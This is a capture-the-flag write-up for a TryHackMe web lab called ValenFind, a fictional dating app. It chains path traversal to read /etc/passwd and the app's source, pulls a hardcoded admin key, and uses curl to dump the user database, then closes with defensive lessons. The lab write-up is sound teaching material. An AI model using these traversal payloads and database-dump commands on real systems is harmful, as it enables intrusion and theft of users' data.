# ValenFind — TryHackMe

## Challenge Name
ValenFind

## Category
Web Exploitation

## Difficulty
Easy

## Description
ValenFind is a fictional dating app described as "vibe-coded" by its creator. The app lets users register, complete a profile, browse other users' profiles, and "like" them. The goal is to identify weaknesses introduced by AI-assisted / inexperienced development and use them to escalate from a normal registered user to full database access.

## Tools Used
- Firefox Developer Tools (Network tab, View Page Source)
- `curl`
- `sqlite3`

## Methodology

The overall approach followed a standard black-box web app testing flow:

1. **Reconnaissance** — Interact with the app as a normal user first (register, log in, browse) while watching the Network tab for interesting requests.
2. **Source review** — Once authenticated, inspect the rendered page source for client-side logic, since many "vibe-coded" apps push logic into the frontend and reveal backend behavior through it.
3. **Endpoint discovery** — Identify any dynamic parameters (file names, IDs, template names) that look like they might map directly to server-side file or database operations.
4. **Vulnerability confirmation** — Test the suspected parameter for path traversal / Local File Inclusion (LFI).
5. **Source code disclosure** — Use the confirmed LFI to read the application's own source code, since that's often the fastest way to find hardcoded secrets or undocumented routes.
6. **Privilege escalation** — Use any secrets or hidden routes found in the source to reach higher-privilege functionality (in this case, an admin-only database export endpoint).
7. **Data extraction** — Pull and inspect the exposed data for the flag or sensitive information.

## Step-by-step Solution

### Step 1 — Register and explore
Registered a new account and completed the profile setup flow. Browsed to `/dashboard`, which listed other seeded "match" profiles (romeo, casanova, cleo, sherlock, gatsby, jane, dracula, cupid).

### Step 2 — Inspect a profile page's source
Clicking into a profile (e.g. `casanova_official`) loaded a page whose bio/theme content was fetched dynamically via JavaScript:

```javascript
fetch(`/api/fetch_layout?layout=${layoutName}`)
    .then(r => r.text())
    .then(html => {
        let rendered = html.replace('__USERNAME__', username)
                           .replace('__BIO__', bioText);
        document.getElementById('bio-container').innerHTML = rendered;
    });
```

This revealed an endpoint, `/api/fetch_layout`, that takes a `layout` query parameter and returns raw file contents — a strong signal for path traversal / LFI.

### Step 3 — Confirm LFI
Requested the endpoint with a path traversal payload:

```
GET /api/fetch_layout?layout=../../../../etc/passwd
```

This returned the full contents of `/etc/passwd`, confirming the parameter was passed into a file read with no path sanitization.

### Step 4 — Read the application source code
Since the endpoint could read arbitrary files relative to a known base directory, the same technique was used to pull the app's own source:

```
GET /api/fetch_layout?layout=../app.py
```

This returned the full Flask source code. Reviewing it revealed:

- A hardcoded admin API key:
  ```python
  ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
  ```
- An undocumented admin route that exports the entire SQLite database if the correct header is supplied:
  ```python
  @app.route('/api/admin/export_db')
  def export_db():
      auth_header = request.headers.get('X-Valentine-Token')
      if auth_header == ADMIN_API_KEY:
          return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')
      else:
          return jsonify({"error": "Forbidden", ...}), 403
  ```
- A basic blocklist attempting to prevent direct access to `cupid.db` and `seeder.py` through the same LFI endpoint (bypassed here by pivoting to the DB export route instead of fighting the filter).

### Step 5 — Use the leaked key to dump the database
With the key in hand, called the admin export endpoint directly with `curl`, supplying the custom header the source code expected:

```bash
curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
     http://<target-ip>:5000/api/admin/export_db \
     -o valenfind_leak.db
```

This downloaded the full SQLite database file.

### Step 6 — Inspect the database
Opened the dumped database and reviewed all rows in the `users` table:

```bash
sqlite3 valenfind_leak.db
```
```sql
.tables
SELECT * FROM users;
```

Among the seeded users was a `cupid` account with the role "System Administrator," whose `address` field contained the flag instead of a real address — clearly planted there as the objective.

## Commands Used
```bash
# Confirm LFI via /etc/passwd
curl "http://<target-ip>:5000/api/fetch_layout?layout=../../../../etc/passwd"

# Read application source code
curl "http://<target-ip>:5000/api/fetch_layout?layout=../app.py"

# Dump database using leaked admin key
curl -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
     http://<target-ip>:5000/api/admin/export_db \
     -o valenfind_leak.db

# Inspect the database
sqlite3 valenfind_leak.db
.tables
SELECT * FROM users;
```

## Lessons Learned
- **Never trust user-supplied file names in server-side file operations.** Any parameter that gets passed into `open()`, `os.path.join()`, or similar without strict allow-listing (e.g. matching against a known set of valid filenames) is a path traversal risk.
- **Blocklists are not a substitute for allowlists.** The app tried to block access to `cupid.db` and `seeder.py` by string-matching the filename, but this did nothing to prevent reading other sensitive files like the application's own source code.
- **Never hardcode secrets in source code**, especially when that same code is reachable via an unrelated vulnerability (LFI). A leaked API key defeats authentication entirely regardless of how strong the key itself is.
- **Undocumented "admin" endpoints are still part of the attack surface.** An endpoint that isn't linked anywhere in the UI is still discoverable through source code review and should be protected with real authentication (sessions/roles), not just a static shared secret.
- **Sensitive data should never be stored in fields intended for unrelated purposes** (e.g. a flag stored in an "address" column). Data exposure risk should be considered per-field, not just per-endpoint.
- Chaining low-severity issues (LFI → source disclosure → hardcoded secret → admin endpoint → full DB dump) can add up to full compromise, even when no single step looks catastrophic on its own.